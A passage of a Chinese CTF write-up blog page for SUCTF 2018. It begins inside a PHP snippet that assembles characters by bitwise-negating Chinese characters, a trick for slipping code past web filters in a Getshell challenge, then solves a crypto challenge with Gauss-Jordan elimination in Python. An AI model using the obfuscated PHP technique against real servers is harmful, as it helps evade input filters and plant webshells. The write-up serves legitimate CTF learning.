$__=~俱[$_].~得[$_].~住[$_].~伽[$_].~结[$_].~二[$_].~鹫[$_].~一[$_].~已[$_].~足[$_].~流[$_].~索[$_].~峰[$_].~精[$_].~山[$_].~尽[$_].~诸[$_].~宣[$_].~正[$_].~第[$_].~竟[$_].~誓[$_].~马[$_].~言[$_].~解[$_].~如[$_].~神[$_].~大[$_].~声[$_].~梵[$_].~顶[$_].~堪[$_].~城[$_].~果[$_].~坛[$_].~真[$_].~相[$_].~皆[$_].~百[$_].~是[$_].~闻[$_].~薄[$_].~数[$_].~生[$_].~响[$_].~和[$_].~摩[$_].~萨[$_].~叶[$_].~王[$_].~千[$_].~猛[$_].~苾[$_].~办[$_].~所[$_].~我[$_].~自[$_].~熙[$_].~慧[$_].~脱[$_].~烦[$_].~邬[$_].~恼[$_];</span></span><br><span class="line"><span class="comment"># var_dump($__);</span></span><br><span class="line"><span class="comment"># // string(63) &quot;@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h2><p>把magic视为256x256的由0，1组成的矩阵M，把cipher视为256x1的矩阵C，把key视为256x1的矩阵K，已知M,C，且M*K = C (.mod 2)，求K。</p>
+<p>可以采用<code>Gauss-Jordan 消元法 </code> 将增广矩阵<code>[M|C]</code> 简化为行阶梯形矩阵，那么变化后的C就是我们的解K。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">read_to_int_array = <span class="keyword">lambda</span> x:[<span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">list</span>(<span class="built_in">bin</span>(<span class="built_in">int</span>(line,<span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>))) <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(x).readlines()]</span><br><span class="line">cipher = read_to_int_array(<span class="string">&#x27;cipher.txt&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">magic = read_to_int_array(<span class="string">&#x27;magic.txt&#x27;</span>)</span><br><span class="line">dim=<span class="built_in">len</span>(cipher)</span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(col,dim):</span><br><span class="line">        <span class="keyword">if</span> magic[row][col]==<span class="number">1</span>:</span><br><span class="line">            magic[col],magic[row]=magic[row],magic[col]</span><br><span class="line">            cipher[col],cipher[row]=cipher[row],cipher[col]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">        <span class="keyword">if</span> magic[row][col]==<span class="number">1</span> <span class="keyword">and</span> row!=col:</span><br><span class="line">            <span class="keyword">for</span> each_in_row <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">                magic[row][each_in_row]^=magic[col][each_in_row]</span><br><span class="line">            cipher[row]^=cipher[col]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;flag&#123;%s&#125;&quot;</span>%<span class="built_in">hex</span>(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,cipher)),<span class="number">2</span>))[<span class="number">2</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="comment">#flag&#123;Now_you_know_the_Hill_Cipher_xwg&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>参考链接：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/u010182633/article/details/45225179">https://blog.csdn.net/u010182633/article/details/45225179</a> </li>
+<li><a target="_blank" rel="noopener" href="https://github.com/0h2o/docs/tree/gh-pages/WriteUps/SUCTF2018/CNSS_SUCTF_WRITEUP">https://github.com/0h2o/docs/tree/gh-pages/WriteUps/SUCTF2018/CNSS_SUCTF_WRITEUP</a> </li>
+<li>也可尝试借助matlab的 <a target="_blank" rel="noopener" href="https://ww2.mathworks.cn/help/matlab/ref/rref.html">rref</a> 。</li>
+</ul>
+<h1 id="题目备份"><a href="#题目备份" class="headerlink" title="题目备份"></a>题目备份</h1><p><a target="_blank" rel="noopener" href="https://github.com/findneo/ctfgodown/tree/master/20180527-suctf">https://github.com/findneo/ctfgodown/tree/master/20180527-suctf</a>    </p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="findneo 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/180512KalionDocker/" rel="prev" title="在win10家庭版上的Docker中使用Kali">
+      <i class="fa fa-chevron-left"></i> 在win10家庭版上的Docker中使用Kali
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/180706DoubanMovie/" rel="next" title="根据豆瓣观影记录生成海报">
+      根据豆瓣观影记录生成海报 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">1.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sandgame"><span class="nav-number">1.1.</span> <span class="nav-text">sandgame</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cycle"><span class="nav-number">1.2.</span> <span class="nav-text">Cycle</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Anonymous"><span class="nav-number">2.1.</span> <span class="nav-text">Anonymous</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Getshell"><span class="nav-number">2.2.</span> <span class="nav-text">Getshell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CRYPTO"><span class="nav-number">3.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Magic"><span class="nav-number">3.1.</span> <span class="nav-text">Magic</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%A4%87%E4%BB%BD"><span class="nav-number">4.</span> <span class="nav-text">题目备份</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="findneo"
+      src="/images/findneo.png">
+  <p class="site-author-name" itemprop="name">findneo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">79</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/findneo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;findneo" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/findneo_" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;findneo_" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">findneo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
